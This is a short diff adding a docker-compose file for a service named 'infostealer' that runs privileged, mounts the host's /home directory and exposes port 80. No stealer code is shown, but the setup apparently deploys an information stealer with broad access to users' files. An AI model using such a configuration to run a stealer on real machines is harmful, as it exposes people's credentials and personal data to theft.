@@ -1,0 +1,9 @@
+services:
+  infostealer:
+    build: .
+    container_name: infostealer
+    privileged: true        # keep if you really need it
+    volumes:
+      - /home:/home
+    ports:
+      - "80:80"
